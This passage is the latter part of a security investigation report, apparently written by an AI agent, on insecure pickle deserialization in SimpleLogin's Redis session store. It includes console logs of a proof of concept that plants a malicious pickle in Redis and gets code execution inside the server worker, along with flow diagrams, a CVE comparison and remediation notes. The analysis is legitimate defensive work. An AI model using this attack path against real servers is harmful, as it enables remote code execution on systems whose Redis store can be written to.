c0589253-ff93-4a2a-9430-c6917cd6b7e3      # <-- returns the uuid; the payload is not involved

# Tampering the Redis payload requires NO change to the cookie (no MAC over payload):
cookie BEFORE tamper == cookie AFTER tamper ?  True

# Overwrite ONLY the Redis payload with the malicious pickle, keep the UNMODIFIED cookie:
>>> r.set("session:c0589253-ff93-4a2a-9430-c6917cd6b7e3", <malicious 123 bytes>)
$ GET /dashboard   (unmodified legit cookie)
HTTP/1.0 302 FOUND
$ cat /tmp/pwned_marker
code-exec-during-pickle.loads ppid=16035 epoch=1783489450     # ppid=16035 => server worker executed it
```

**Reasoning.** `unsign(...)` returns the UUID and never touches the Redis payload; the cookie is **byte-identical** before and after tampering, proving the signature is over the *pointer* only. The attacker changes bytes the signer does not cover, so the request still passes cookie validation, still points at the poisoned key, and still reaches `pickle.loads` (`app/session.py:76`) → code execution.

### R6 — `BadSignature` contrast (condition 4)

```console
# Malicious payload planted at session:a534cc8d-a262-4efb-a463-9a70d2773433 (EXISTS=1)
# Valid cookie: a534cc8d-a262-4efb-a463-9a70d2773433.kzVho7kOBbBIvxDZyPWFB2wtOSw
# Forge by flipping the last signature char (w -> A):
forged =         a534cc8d-a262-4efb-a463-9a70d2773433.kzVho7kOBbBIvxDZyPWFB2wtOSA

$ python -c "import itsdangerous
s = itsdangerous.Signer('secret', salt='session', key_derivation='hmac')
s.unsign('a534cc8d-a262-4efb-a463-9a70d2773433.kzVho7kOBbBIvxDZyPWFB2wtOSA')"
Traceback (most recent call last):
  ...
itsdangerous.exc.BadSignature: Signature b'kzVho7kOBbBIvxDZyPWFB2wtOSA' does not match

# BEFORE: marker absent
$ GET /dashboard   (FORGED cookie)
HTTP/1.0 302 FOUND
Location: http://127.0.0.1:7777/auth/login?next=%2Fdashboard%3F
# AFTER: marker STILL absent; the malicious Redis payload was never read
$ test -f /tmp/pwned_marker && echo EXISTS || echo ABSENT
ABSENT
$ redis-cli EXISTS session:a534cc8d-a262-4efb-a463-9a70d2773433 -> (integer) 1   # untouched, never loaded
```

**Reasoning.** A bad signature makes `extract_and_validate_session_id` catch `itsdangerous.BadSignature` and return `None` (`app/session.py:58-59`); `open_session` then returns a fresh session at `app/session.py:70-71` **without ever calling `_redis_r.get`**, so the poisoned payload is never deserialized — the marker stays absent.

**R6 conclusion.** The signature protects **which key is read** (the pointer), **not whether that key's payload is safe** (the pickle). Therefore: forging the ID → harmless fresh session (payload never read); tampering the payload while reusing a valid cookie → **code execution**. An attacker who cannot forge the cookie but *can* write to Redis is still a serious threat, because the integrity guarantee simply does not extend to the pickled bytes.

---

## Conditions covered (before / during / after)

Every named condition the questions imply was exercised at runtime. State-changing conditions report `before` → `during/intermediate` → `after`.

| # | Condition | before | during / intermediate | after |
|---|-----------|--------|------------------------|-------|
| 1 | **Happy-path authenticated login** | pre-login CSRF-only session `e9cda0f3-…`, keys `['_fresh','_permanent','csrf_token']`, TTL 300 | real `POST /auth/login` → `login_user()` (`login_utils.py:36`) | `302 → /dashboard/`; same UUID (no rotation on login); keys now `['_fresh','_id','_permanent','_user_id','csrf_token','sudo_time']`; TTL 604800 |
| 2 | **Happy-path logout** | authenticated `e9cda0f3-…`, Redis EXISTS=1 | `GET /auth/logout` → `logout_session()` → `purge_session` | old key deleted (EXISTS=0); ID rotated to `e0f86ac7-…`; 4 `Set-Cookie` incl. empty `slapp` delete + new rotated `slapp` |
| 3 | **Unauthenticated CSRF-only** | — | `GET /auth/login` (no login) | session holds `['_fresh','_permanent','csrf_token']`; **TTL 300** (`app/session.py:95-96`) |
| 4 | **`BadSignature` forged cookie** | malicious payload planted at `a534cc8d-…`, marker absent | flip last sig char (`w`→`A`) → `unsign` raises `BadSignature` | `302 → /auth/login`; **marker absent**; Redis payload **never read** (`app/session.py:58-59`, `70-71`) |
| 5 | **Random bytes** | authenticated `9a35e687-…`, TTL 604800, `/dashboard`=200 | `r.set(...,b"\x00\x01\x02not-a-pickle\xff\xfe")` → `UnpicklingError: invalid load key, '\x00'.` | **silent reset** to `444f6a27-…`; `302`, not 500; garbage key still present |
| 6 | **Truncated valid pickle** | authenticated `b8712a09-…`, TTL 604800 | write first 65 of 131 bytes → `UnpicklingError: pickle data was truncated` | **silent reset** to `4996bd9b-…`; `302`, not 500 |
| 7 | **Well-formed malicious pickle** | authenticated `b886149a-…`, marker absent | plant 123-byte malicious pickle → `posix.system` runs **inside** `pickle.loads` (`app/session.py:76`) | **code executed** (marker `ppid=16035`); request `302`, log has no error — indistinguishable from a reset |
| 8 | **Tamper-without-forgery** | real login `c0589253-…`, valid cookie | overwrite only Redis payload; cookie byte-identical (no MAC); `unsign` returns the UUID | request with **unmodified** legit cookie → **code executed** (marker `ppid=16035`) |

---

## `open_session` decision logic

In prose: on each request, `open_session` (`app/session.py:68-80`) extracts and validates the session ID from the `slapp` cookie (`extract_and_validate_session_id`, `app/session.py:47-59`). **If the cookie is missing or its signature is invalid** (`BadSignature`), it returns a **fresh** `ServerSession` with a new UUID (`app/session.py:70-71`) and **never touches Redis**. Otherwise it reads `session:<uuid>` from Redis (`app/session.py:73`). **If the value is absent**, it returns a fresh session. **If the value is present**, it calls `pickle.loads(val)` (`app/session.py:76`), and exactly one of three things happens: (a) a **valid benign** pickle → the stored `dict` is restored into a `ServerSession` (`app/session.py:77`); (b) an **invalid** pickle (random/truncated/corrupt) → an exception is raised, caught by `except Exception: pass` (`app/session.py:78-79`), and a fresh session is returned (`app/session.py:80`); or (c) a **valid malicious** pickle → its `__reduce__` executes **during** `loads` (code execution) *before* any `except` can help, because no exception is raised.

```mermaid
flowchart TD
    A[Incoming request with slapp cookie] --> B{Cookie present and signature valid?}
    B -- No / BadSignature --> C[Return fresh ServerSession new uuid<br/>app/session.py:70-71, L80<br/>Redis never read]
    B -- Yes --> D[Read Redis key session:uuid<br/>app/session.py:73]
    D --> E{Value present?}
    E -- No --> C
    E -- Yes --> F[pickle.loads value<br/>app/session.py:76]
    F -- Raises UnpicklingError etc --> G[except Exception: pass<br/>silent reset, no log<br/>app/session.py:78-80]
    F -- Valid benign pickle --> H[Return ServerSession with data<br/>normal session restored]
    F -- Valid MALICIOUS pickle --> I[__reduce__ executes during loads<br/>CODE EXECUTION, not caught]
```

---

## Web-research rationale (R5 / R6)

The runtime findings match the well-documented CWE-502 (Deserialization of Untrusted Data) model for pickle-backed cache/session stores; research is cited briefly as supporting rationale (not as a substitute for the observed evidence above).

- **CVE-2021-33026 (Flask-Caching) — the direct analog.** Flask-Caching (through v1.10.1) uses `pickle` for its cache and applies no message-authentication over the stored bytes; an actor with write access to the backend (filesystem, Memcached, **Redis**) can plant a payload that runs arbitrary Python during deserialization. Public write-ups note that `pickle.loads` reconstructs objects by invoking `__reduce__`, so a crafted object's callable (e.g., `os.system`) runs at load time; they also note exploitation "typically requires prior access to the cache store," which lowers likelihood but does not eliminate risk in shared or misconfigured environments. This is structurally identical to SimpleLogin's `RedisSessionStore`: a pickle payload in Redis with no MAC over the bytes. Sources: `sentinelone.com/vulnerability-database/cve-2021-33026`, `miggo.io/vulnerability-database/cve/CVE-2021-33026`.
- **Pickle executes during load.** A well-formed malicious pickle does **not** raise; its `__reduce__` callable runs *inside* `pickle.loads`, so a bare `try/except` around `loads` cannot prevent execution — only random/truncated bytes raise (and get caught). This is exactly what R5's marker file demonstrated at runtime. Sources: `knowledge.dhound.io` (pickle code execution), `chocapikk.com` (pickle RCE write-up).
- **`itsdangerous` `Signer` vs `Serializer`.** `Signer` signs **raw bytes only**; `Serializer` wraps a signer to sign *serialized* data. SimpleLogin uses `itsdangerous.Signer` over the session-ID string (`app/session.py:37-41`), which authenticates the ID pointer but **not** the pickled payload — the root of the R6 conclusion. Source: `itsdangerous.palletsprojects.com`.
- **Remediation baseline (rationale only — NOT implemented here, per the read-only mandate).** Prefer JSON over pickle for session/cache payloads; if pickle is unavoidable, use a restricted `Unpickler` allowlist and/or MAC the stored payload; restrict and authenticate Redis network access so only app servers can reach it.

---

## Dependency versions exercised (canonical, Python 3.10)

Pinned in `poetry.lock`; the canonical runtime is Python 3.10 (`pyproject.toml:61`, `Dockerfile:8`).

| Package | Version | Role in the session path |
|---------|---------|--------------------------|
| Flask | 1.1.2 | `SessionInterface`; Flask 1.x attribute APIs (`app.secret_key`, `app.session_cookie_name`, `app.permanent_session_lifetime`) used by `app/session.py` |
| flask-login | 0.5.0 | `login_user`/`logout_user`; populates `_user_id`, `_fresh`, `_id`; `session_protection="strong"` |
| itsdangerous | 1.1.0 | `Signer` (HMAC) over the session-ID cookie — signs the pointer, not the payload |
| werkzeug | 1.0.1 | `CallbackDict` (base of `ServerSession`); WSGI request/response primitives |
| redis | 4.6.0 | Redis client (via the `limits` storage library) backing the store |
| flask-limiter | 1.4 | provides `limits.storage.RedisStorage`/`RedisSentinelStorage` used in `app/redis_services.py` |
| (stdlib) `pickle` / `cPickle` | — | the serializer at the center of the analysis (`app/session.py:9-12`); `cPickle` unavailable on Py3 → stdlib `pickle` |

---

## Coverage pass

| Item | Answered by name? | Concrete observed value | `file:line` | Sibling variants | Causal reasoning |
|------|-------------------|-------------------------|-------------|------------------|------------------|
| **R1** | ✅ | `pickle.loads(val)`; stdlib `pickle` @ `/usr/local/lib/python3.10/pickle.py`; protocol 4 | `app/session.py:76`, `:9-12`, `:44-45`, `:18` | `pickle.dumps` write side (`:91`) | Redis holds bytes; pickle round-trips the dict |
| **R2** | ✅ | login keys `['_fresh','_id','_permanent','_user_id','csrf_token','sudo_time']`; TTL 604800; logout rotates `e9cda0f3→e0f86ac7`, old key deleted | `:105-114`, `:91-104`, `:61-66`, `:117-121`; `login_utils.py:36-37`; `logout.py:13-15` | CSRF-only (TTL 300) vs auth (7d); API logout (inferred) | `login_user`/`sudo_time` populate; `purge_session` deletes+rotates |
| **R3** | ✅ | random → `invalid load key, '\x00'.`; truncated → `pickle data was truncated`; both **silent reset** | `:76`, `:78-80` | random **and** truncated | `UnpicklingError ⊂ Exception` → caught → fresh session |
| **R4** | ✅ | `302`/`200` (never 500); log has no `UnpicklingError`/`Traceback`/`ERROR`; `SENTRY_DSN=None` | `:78-79`; `app/log.py:41,51,70-71,79`; `server.py:111,284` | responses vs logs vs Sentry | no logging on the except path; caught ≠ uncaught |
| **R5** | ✅ | marker `ppid=16035` written by worker during `loads`; malicious req 302 like a reset | `:76`, `:78-80` | benign reset vs code exec | valid pickle doesn't raise → `__reduce__` runs before `except` |
| **R6** | ✅ | `unsign` returns the UUID; cookie byte-identical after tamper; forged → `BadSignature`, payload never read | `:37-41`, `:54-59`, `:102-104`, `:70-71` | tamper-without-forgery vs BadSignature | signer covers pointer, not payload |

**Conditions 1–8** are each exercised with `before/during/after` in the [Conditions covered](#conditions-covered-before--during--after) table.

---

## Appendix: repository integrity proof

This investigation was strictly **read-only** on all existing source. All observation helpers (the login driver, the Redis poisoner, the pickle probe) lived under `/tmp` (outside the repository) and were deleted afterward; the 5 planted Redis keys were deleted; the `/tmp/pwned_marker` marker was removed; and the gunicorn server that was started for the investigation was stopped. The only artifact added to the repository is **this document** (plus the new `blitzy/` and `blitzy/documentation/` directories that contain it).

**Branch (unchanged, the assigned work branch):**

```console
$ git rev-parse --abbrev-ref HEAD
blitzy-82163eff-1204-4fd2-99f5-0ba7521c2fbe
```

**`git status --porcelain` — the ONLY change is the new documentation directory:**

```console
$ git status --porcelain
?? blitzy/

$ git status --porcelain --untracked-files=all
?? blitzy/documentation/app_2cd6ee777f8c.md
```

**Zero modifications to any tracked source file:**

```console
$ git diff --stat
# (no output — zero tracked-file modifications)
```

**No stray temporary/marker files remain anywhere in the repository tree:**

```console
$ find . -path ./.git -prune -o \( -name 'obs_*.py' -o -name 'blitzy_adhoc_test_*' -o -name 'pwned_marker' -o -name 'sl_server.log' \) -print
# (no output — clean)
```

---

### Canonical vs. non-canonical labeling summary

- **CANONICAL:** Every runtime value in R1–R6 and the Conditions table was produced in the **Python 3.10.18** Docker build (`ghcr.io/scaleapi/swe-atlas:swe_atlas_QnA_simple-login_app_1.0`), driving the real `login()`/`logout_session()` entry points against a live `gunicorn` server with a real Redis and `FLASK_SECRET`.
- **inferred (labeled inline):** the API-logout sibling `app/api/views/user_info.py:140,142` (not exercised, but calls the identical `logout_session()`/`delete_cookie` pair); and the clause "even if Sentry were initialized, a *caught* exception would not be reported" (the "Sentry not initialized" fact itself is observed via `SENTRY_DSN = None`).
- **NON-CANONICAL:** none of the reported evidence relies on the Python 3.13 host sandbox; the local `pickle.loads` reproductions were run under the canonical 3.10 interpreter and are labeled as such next to each command.
